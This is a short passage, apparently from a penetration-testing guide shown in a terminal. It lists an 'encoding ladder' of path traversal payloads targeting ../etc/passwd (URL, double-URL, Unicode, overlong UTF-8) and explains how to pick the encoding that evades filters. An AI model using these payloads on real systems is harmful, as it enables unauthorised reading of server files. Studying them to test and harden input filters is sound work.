[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Encoding Ladder for Path Traversal                                       [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ENCODING LADDER (apply progressively):                                       [34m│[0m
[34m│[0m ───────────────────────────────────────────────────────────────────          [34m│[0m
[34m│[0m Raw          │ ../etc/passwd                                                 [34m│[0m
[34m│[0m URL          │ ..%2Fetc%2Fpasswd                                             [34m│[0m
[34m│[0m Double-URL   │ ..%252F...                                                    [34m│[0m
[34m│[0m Unicode      │ \u002e\u002e/                                                 [34m│[0m
[34m│[0m UTF-8 Overlong│ %c0%ae (for .)                                               [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **KEY INSIGHT:** Filters decode at one layer, execution happens at another.  [34m│[0m
[34m│[0m - If filter checks URL-decoded but backend double-decodes → double-encode    [34m│[0m
[34m│[0m - If filter checks raw but backend URL-decodes → URL-encode                  [34m│[0m
